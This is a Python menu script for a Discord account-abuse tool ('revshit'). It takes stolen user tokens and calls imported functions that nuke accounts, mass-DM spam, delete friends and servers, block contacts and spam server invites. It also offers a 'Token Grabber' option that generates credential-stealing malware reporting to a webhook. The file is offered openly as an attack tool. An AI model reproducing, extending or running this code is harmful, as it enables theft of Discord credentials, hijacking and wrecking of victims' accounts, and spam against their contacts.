import os
import sys
import fade
import time
from colorama import Fore
from utils.massDM import *
from utils.closeDMs import *
from utils.tokenInfo import *
from utils.leaveServer import*
from utils.fuckAccount import *
from utils.accountNuker import *
from utils.getAllFriends import*
from utils.deleteFriends import *
from utils.deleteServers import *
from utils.createServers import *
from utils.deleteWebhook import *
from utils.DownloadToken import *
from utils.blockAllFriends import *
from utils.hypesquadChanger import *

# ========================================================================================================================================================= #

def main():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("revshit | @htrbkael")

    # ========================================================================================================================================================= #

    banner = """
                          ⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂
\x1b[0m[\x1b[34m1\x1b[0m] \x1b[34mNuke\x1b[0m Token        [\x1b[34m10\x1b[0m] \x1b[34mGet All\x1b[0m Friends          
\x1b[0m[\x1b[34m2\x1b[0m] \x1b[34mLeave\x1b[0m Servers     [\x1b[34m11\x1b[0m] \x1b[34mToken\x1b[0m Info              
\x1b[0m[\x1b[34m3\x1b[0m] \x1b[34mDelete\x1b[0m Friends    [\x1b[34m12\x1b[0m] \x1b[34mToken\x1b[0m Checker         
\x1b[0m[\x1b[34m4\x1b[0m] \x1b[34mDelete\x1b[0m Servers    [\x1b[34m13\x1b[0m] \x1b[34mFuck\x1b[0m Account         
\x1b[0m[\x1b[34m5\x1b[0m] \x1b[34mMass\x1b[0m Dm           [\x1b[34m14\x1b[0m] \x1b[34mDelete\x1b[0m Webhook           
\x1b[0m[\x1b[34m6\x1b[0m] \x1b[34mClose\x1b[0m DMs         [\x1b[34m15\x1b[0m] \x1b[34mCredits\x1b[0m                         
\x1b[0m[\x1b[34m7\x1b[0m] \x1b[34mCreate\x1b[0m Servers 
\x1b[0m[\x1b[34m8\x1b[0m] \x1b[34mBlock All\x1b[0m Friends                  
\x1b[0m[\x1b[34m9\x1b[0m] \x1b[34mToken\x1b[0m Grabber  
    """
    faded_banner = fade.purpleblue(banner)
    print(faded_banner)

    # ========================================================================================================================================================= #

    info = f"""{Fore.LIGHTCYAN_EX}\t\t\t\t\t  [+] Redone By @htrbkael"""
    for x in info:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()

# ========================================================================================================================================================= #

    choice = input(f"#{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
    if choice == "1":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        message = "@here discord.gg/revshit discord.gg/xorev"
        start_nuke(token=token, content=message)
    elif choice == "2":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        leaveServer(token)
    elif choice == "3":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteFriends(token)
    elif choice == "4":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteServers(token)
    elif choice == "5":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        message = input(f"{Fore.LIGHTCYAN_EX}Message{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        massDM(token=token, content=message)
    elif choice == "6":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        close_all_dms(token=token)
    elif choice == "7":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        count = input(f"{Fore.LIGHTCYAN_EX}Count{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        name = input(f"{Fore.LIGHTCYAN_EX}Name{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        createServers(token=token, count=count, name=name)
    elif choice == "8":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        blockAllFriends(token=token)
    elif choice == "9":
        clear_banner()
        webhook = input(f"Webhook{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        downloadGrabber(webhook=webhook)
    elif choice == "10":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        get_all_friends(token=token)
    elif choice == "11":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        tokenInfo(token=token)
    elif choice == "12":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        validateToken(token=token)
    elif choice == "13":
        clear_banner()
        token = input(f"Token{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        fuckAccount(token=token)
    elif choice == "14":
        clear_banner()
        link = input(f"Webhook{Fore.LIGHTBLACK_EX}:{Fore.WHITE}>> ")
        deleteWebhook(link)
    elif choice == "15":
        socials()
    elif choice == "16":
        exit(-1)

# ========================================================================================================================================================= #

def socials():
    # Clear the consoe to get better view :)
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    # Set Console title
    set_console_title("@htrbkael | discord.gg/revshit")

    banner = f"""
                          ⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂ 
[+] xtazy, revshit, xorev, topthree  
    """
    faded_banner = fade.pinkred(banner)
    for x in faded_banner:
        time.sleep(0.0001)
        sys.stdout.write(x)
        sys.stdout.flush()
    print()
    time.sleep(2)
    input("Press any key to continue...")

# ========================================================================================================================================================= #

while True:
    main()
